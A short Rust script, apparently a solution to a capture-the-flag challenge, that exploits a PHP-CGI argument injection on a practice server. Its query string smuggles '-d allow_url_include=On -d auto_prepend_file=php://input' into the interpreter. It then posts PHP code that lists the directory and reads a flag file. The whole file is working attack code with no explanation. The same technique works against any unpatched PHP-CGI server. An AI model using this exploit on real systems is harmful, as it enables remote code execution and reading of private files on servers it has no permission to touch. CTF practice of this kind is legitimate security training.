// cargo-deps: reqwest = "0.8.5"

extern crate reqwest;

use reqwest::{Client, Url};

fn main() {
    const URL: &str = "http://ctfq.sweetduet.info:10080/~q12/index.php";
    let mut url = Url::parse(URL).unwrap();

    const QUERY: &str = "-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input";
    url.set_query(Some(QUERY));

    let client = Client::new();

    const CODE: &str = r#"
<?php

echo "foo";
$res_dir = opendir('.');
while ($file_name = readdir($res_dir)) {
    print "$file_name\n";
}
readfile('flag_flag_flag.txt');
closedir($res_dir);

?>
"#;

    let mut response = client.post(url).body(CODE).send().unwrap();
    let body = response.text().unwrap();

    println!("{}", body);
}
